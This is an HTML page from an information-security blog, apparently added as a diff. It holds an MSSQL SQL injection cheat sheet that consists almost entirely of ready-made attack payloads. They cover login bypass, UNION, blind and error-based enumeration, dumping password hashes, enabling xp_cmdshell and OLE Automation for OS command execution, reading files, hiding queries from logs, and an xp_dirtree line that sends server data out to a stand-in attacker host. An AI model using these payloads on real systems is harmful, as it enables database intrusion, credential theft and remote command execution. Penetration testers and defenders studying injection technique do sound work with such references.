@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="default">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="MSSQL Injection," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="xl7dev" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Comments123/*--;%00  Example:  12SELECT * FROM Users WHERE username = &amp;apos;&amp;apos; OR 1=1 --&amp;apos; AND password = &amp;apos;&amp;apos;;SELECT * FROM Users WHERE id = &amp;apos;&amp;apos; UNION SELECT 1, 2, 3/*&amp;apos;;">
+<meta name="keywords" content="MSSQL Injection">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL Injection Cheat Sheet: MSSQL">
+<meta property="og:url" content="https://blog.safebuff.com/2016/04/11/SQL-Injection-Cheat-Sheet-MSSQL/index.html">
+<meta property="og:site_name" content="xl7dev">
+<meta property="og:description" content="Comments123/*--;%00  Example:  12SELECT * FROM Users WHERE username = &amp;apos;&amp;apos; OR 1=1 --&amp;apos; AND password = &amp;apos;&amp;apos;;SELECT * FROM Users WHERE id = &amp;apos;&amp;apos; UNION SELECT 1, 2, 3/*&amp;apos;;">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-10-12T07:36:11.591Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL Injection Cheat Sheet: MSSQL">
+<meta name="twitter:description" content="Comments123/*--;%00  Example:  12SELECT * FROM Users WHERE username = &amp;apos;&amp;apos; OR 1=1 --&amp;apos; AND password = &amp;apos;&amp;apos;;SELECT * FROM Users WHERE id = &amp;apos;&amp;apos; UNION SELECT 1, 2, 3/*&amp;apos;;">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://blog.safebuff.com/2016/04/11/SQL-Injection-Cheat-Sheet-MSSQL/"/>
+
+
+
+
+
+  <title>SQL Injection Cheat Sheet: MSSQL | xl7dev</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xl7dev</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2016/04/11/SQL-Injection-Cheat-Sheet-MSSQL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xl7dev">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xl7dev">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL Injection Cheat Sheet: MSSQL</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-04-11T20:20:57+08:00">
+                2016-04-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">--</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Example:</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Users WHERE username = &apos;&apos; OR 1=1 --&apos; AND password = &apos;&apos;;</span><br><span class="line">SELECT * FROM Users WHERE id = &apos;&apos; UNION SELECT 1, 2, 3/*&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@version;</span><br><span class="line">SELECT @@VERSION LIKE &apos;%2008%&apos;;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Example:</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">True if MSSQL version is 2008.</span><br><span class="line">SELECT * FROM Users WHERE id = &apos;1&apos; AND @@VERSION LIKE &apos;%2008%&apos;;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h3 id="User-details"><a href="#User-details" class="headerlink" title="User details"></a>User details</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT user;</span><br><span class="line">SELECT current_user;</span><br><span class="line">SELECT SYSTEM_USER;</span><br><span class="line">SELECT USER_NAME();</span><br><span class="line">SELECT USER_NAME(2);</span><br><span class="line">SELECT SUSER_SNAME();</span><br><span class="line">SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;</span><br><span class="line">SELECT (CASE WHEN (IS_SRVROLEMEMBER(&apos;sysadmin&apos;)=1) THEN &apos;1&apos; ELSE &apos;0&apos; END);</span><br></pre></td></tr></table></figure>
+<h3 id="Database-details"><a href="#Database-details" class="headerlink" title="Database details"></a>Database details</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT DB_NAME();</span><br><span class="line">SELECT DB_NAME(5);</span><br><span class="line">SELECT name FROM master..sysdatabases;</span><br></pre></td></tr></table></figure>
+<h3 id="Database-credentials"><a href="#Database-credentials" class="headerlink" title="Database credentials"></a>Database credentials</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name %2b &apos;:&apos;  %2b master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;</span><br></pre></td></tr></table></figure>
+<h3 id="Server-details"><a href="#Server-details" class="headerlink" title="Server details"></a>Server details</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@servername; SELECT host_name(); SELECT SERVERPROPERTY(&apos;productversion&apos;), SERVERPROPERTY(&apos;productlevel&apos;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Examples:</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SERVERPROPERTY(&apos;productversion&apos;), SERVERPROPERTY(&apos;productlevel&apos;), SERVERPROPERTY(&apos;edition&apos;);</span><br></pre></td></tr></table></figure>
+<h3 id="Table-Names"><a href="#Table-Names" class="headerlink" title="Table Names"></a>Table Names</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT name FROM master..sysobjects WHERE xtype=&apos;U&apos;;    #Union</span><br><span class="line">AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; &apos;A&apos;; #Blind</span><br><span class="line">AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables); #Error</span><br><span class="line">AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables)); # Error</span><br></pre></td></tr></table></figure>
+<h3 id="Columns-Names"><a href="#Columns-Names" class="headerlink" title="Columns Names"></a>Columns Names</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = &apos;tablename&apos;); # Union</span><br><span class="line">AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns &gt; &apos;A&apos;; # Blind</span><br><span class="line">AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns); # Error</span><br><span class="line">AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns)); # Error</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>An easier method is available starting with MSSQL 2005 and higher. The XML function path() works as a concatenator, allowing the retrieval of all tables with 1 query.</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name %2b &apos;, &apos; FROM information_schema.tables FOR XML PATH(&apos;&apos;);</span><br></pre></td></tr></table></figure>
+<h3 id="No-Quotes"><a href="#No-Quotes" class="headerlink" title="No Quotes"></a>No Quotes</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Users WHERE username = CHAR(97) + CHAR(98) + CHAR(99);</span><br><span class="line">ASCII(SUBSTRING(SELECT TOP 1 username FROM Users,1,1)) = 97;</span><br><span class="line">ASCII(SUBSTRING(SELECT TOP 1 username FROM Users,1,1)) &lt; 128;</span><br></pre></td></tr></table></figure>
+<h3 id="String-Concatenation"><a href="#String-Concatenation" class="headerlink" title="String Concatenation"></a>String Concatenation</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONCAT(&apos;a&apos;,&apos;a&apos;,&apos;a&apos;);</span><br><span class="line">SELECT &apos;a&apos; %2b &apos;b&apos; %2b &apos;c&apos; %2b &apos;d&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="Conditionals"><a href="#Conditionals" class="headerlink" title="Conditionals"></a>Conditionals</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IF 1=1 SELECT &apos;true&apos; ELSE SELECT &apos;false&apos;;</span><br><span class="line">SELECT CASE WHEN 1=1 THEN true ELSE false END;</span><br></pre></td></tr></table></figure>
+<h3 id="Time-delay"><a href="#Time-delay" class="headerlink" title="Time-delay"></a>Time-delay</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY &apos;time_to_pass&apos;;</span><br><span class="line">WAITFOR TIME &apos;time_to_execute&apos;;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Example:</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF 1=1 WAITFOR DELAY &apos;0:0:5&apos; ELSE WAITFOR DELAY &apos;0:0:0&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="Enable-Command-Execution"><a href="#Enable-Command-Execution" class="headerlink" title="Enable Command Execution"></a>Enable Command Execution</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &apos;show advanced options&apos;, 1;</span><br><span class="line">EXEC sp_configure reconfigure;</span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;, 1;</span><br><span class="line">EXEC sp_configure reconfigure;</span><br></pre></td></tr></table></figure>
+<h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &apos;cmd&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="Enable-Alternative-Command-Execution"><a href="#Enable-Alternative-Command-Execution" class="headerlink" title="Enable Alternative Command Execution"></a>Enable Alternative Command Execution</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &apos;show advanced options&apos;, 1;</span><br><span class="line">EXEC sp_configure reconfigure;</span><br><span class="line">EXEC sp_configure &apos;OLE Automation Procedures&apos;, 1;</span><br><span class="line">EXEC sp_configure reconfigure;</span><br></pre></td></tr></table></figure>
+<h3 id="Alternative-Command-Execution"><a href="#Alternative-Command-Execution" class="headerlink" title="Alternative Command Execution"></a>Alternative Command Execution</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @execmd INT;</span><br><span class="line">EXEC SP_OACREATE &apos;wscript.shell&apos;, @execmd OUTPUT;</span><br><span class="line">EXEC SP_OAMETHOD @execmd, &apos;run&apos;, null, &apos;%systemroot%system32cmd.exe /c&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="“RunAs”"><a href="#“RunAs”" class="headerlink" title="“RunAs”"></a>“RunAs”</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM OPENROWSET(&apos;SQLOLEDB&apos;, &apos;127.0.0.1&apos;;&apos;sa&apos;;&apos;password&apos;, &apos;SET FMTONLY OFF execute master..xp_cmdshell &quot;dir&quot;&apos;);</span><br><span class="line">EXECUTE AS USER = &apos;FooUser&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="Read-Files"><a href="#Read-Files" class="headerlink" title="Read Files"></a>Read Files</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BULK INSERT dbo.temp FROM &apos;c:foobar.txt&apos; WITH ( ROWTERMINATOR=&apos;n&apos; );</span><br></pre></td></tr></table></figure>
+<h3 id="Out-of-Band-Retrieval"><a href="#Out-of-Band-Retrieval" class="headerlink" title="Out-of-Band Retrieval"></a>Out-of-Band Retrieval</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;declare @q varchar(200);set @q=&apos;\attacker.controlledserver&apos;+(SELECT SUBSTRING(@@version,1,9))+&apos;.malicious.com/foo&apos;; exec master.dbo.xp_dirtree @q; --</span><br></pre></td></tr></table></figure>
+<h3 id="Substrings"><a href="#Substrings" class="headerlink" title="Substrings"></a>Substrings</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUBSTRING(table_name,1,1) FROM information_schema.tables = &apos;A&apos;;</span><br><span class="line">ASCII(SUBSTRING(table_name,1,1)) FROM information_schema.tables &gt; 96;</span><br></pre></td></tr></table></figure>
+<h3 id="Retrieve-Nth-Line"><a href="#Retrieve-Nth-Line" class="headerlink" title="Retrieve Nth Line"></a>Retrieve Nth Line</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT TOP 1 table_name FROM information_schema.tables;</span><br><span class="line">SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables);</span><br></pre></td></tr></table></figure>
+<h3 id="SP-PASSWORD-Hiding-Query"><a href="#SP-PASSWORD-Hiding-Query" class="headerlink" title="SP_PASSWORD (Hiding Query)"></a>SP_PASSWORD (Hiding Query)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SP_PASSWORD</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Example:</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; AND 1=1--sp_password</span><br></pre></td></tr></table></figure>
+<h3 id="Stacked-Queries"><a href="#Stacked-Queries" class="headerlink" title="Stacked Queries"></a>Stacked Queries</h3><blockquote>
+<p>Example:</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; AND 1=0 INSERT INTO ([column1], [column2]) VALUES (&apos;value1&apos;, &apos;value2&apos;);</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/MSSQL-Injection/" rel="tag"># MSSQL Injection</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/04/11/SQL-Injection-Cheat-Sheet-MySQL/" rel="next" title="SQL Injection Cheat Sheet: MySQL">
+                <i class="fa fa-chevron-left"></i> SQL Injection Cheat Sheet: MySQL
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/04/14/Commandline-JSON-Pretty-Print-everywhere/" rel="prev" title="Commandline JSON Pretty Print everywhere">
+                Commandline JSON Pretty Print everywhere <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460"
+                alt="xl7dev" />
+            
+              <p class="site-author-name" itemprop="name">xl7dev</p>
+              <p class="site-description motion-element" itemprop="description">Information Security</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">86</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.knownsec.com" title="Knownsec" target="_blank">Knownsec</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://javaweb.org" title="园长" target="_blank">园长</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jeary.org" title="jeary" target="_blank">jeary</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.thinkings.org" title="Tr3jer" target="_blank">Tr3jer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.php101.cn" title="tudouya" target="_blank">tudouya</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Comments"><span class="nav-number">1.</span> <span class="nav-text">Comments</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Version"><span class="nav-number">2.</span> <span class="nav-text">Version</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-details"><span class="nav-number">3.</span> <span class="nav-text">User details</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Database-details"><span class="nav-number">4.</span> <span class="nav-text">Database details</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Database-credentials"><span class="nav-number">5.</span> <span class="nav-text">Database credentials</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Server-details"><span class="nav-number">6.</span> <span class="nav-text">Server details</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Table-Names"><span class="nav-number">7.</span> <span class="nav-text">Table Names</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Columns-Names"><span class="nav-number">8.</span> <span class="nav-text">Columns Names</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#No-Quotes"><span class="nav-number">9.</span> <span class="nav-text">No Quotes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#String-Concatenation"><span class="nav-number">10.</span> <span class="nav-text">String Concatenation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Conditionals"><span class="nav-number">11.</span> <span class="nav-text">Conditionals</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Time-delay"><span class="nav-number">12.</span> <span class="nav-text">Time-delay</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enable-Command-Execution"><span class="nav-number">13.</span> <span class="nav-text">Enable Command Execution</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Command-Execution"><span class="nav-number">14.</span> <span class="nav-text">Command Execution</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enable-Alternative-Command-Execution"><span class="nav-number">15.</span> <span class="nav-text">Enable Alternative Command Execution</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Alternative-Command-Execution"><span class="nav-number">16.</span> <span class="nav-text">Alternative Command Execution</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#“RunAs”"><span class="nav-number">17.</span> <span class="nav-text">“RunAs”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Read-Files"><span class="nav-number">18.</span> <span class="nav-text">Read Files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Out-of-Band-Retrieval"><span class="nav-number">19.</span> <span class="nav-text">Out-of-Band Retrieval</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Substrings"><span class="nav-number">20.</span> <span class="nav-text">Substrings</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Retrieve-Nth-Line"><span class="nav-number">21.</span> <span class="nav-text">Retrieve Nth Line</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SP-PASSWORD-Hiding-Query"><span class="nav-number">22.</span> <span class="nav-text">SP_PASSWORD (Hiding Query)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Stacked-Queries"><span class="nav-number">23.</span> <span class="nav-text">Stacked Queries</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xl7dev</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
